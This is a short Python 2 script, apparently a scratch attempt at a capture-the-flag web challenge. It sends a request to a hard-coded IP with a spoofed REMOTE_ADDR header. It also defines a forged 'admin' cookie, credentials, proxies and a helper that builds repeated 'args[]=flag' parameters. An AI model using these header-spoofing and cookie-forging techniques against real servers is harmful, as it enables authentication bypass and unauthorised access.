import requests

params = {'username' : 'howoldaryou22', 'password' : '12471547'}
args = 'flag'
cookie = {'admin': '17ab96bd8ffbe8ca58a78657a9185'}
session = requests.Session()
proxies = {
  "http": "10.10.1.10:3128",
  "https": "10.10.1.10:1080",
}


def gen(num):
	re = 'args[]=flag'
	for i in range(num):
		re += '&args[]='
	return re

headers = {'REMOTE_ADDR': '140.112.251.241'}
r = session.get("http://52.68.245.164" , headers=headers)
print session.cookies.get_dict()
# r = requests.get("http://52.69.244.164:51913", cookies=cookie)


print r.status_code
print r.headers
print r.content
# print r.cookies['auth']
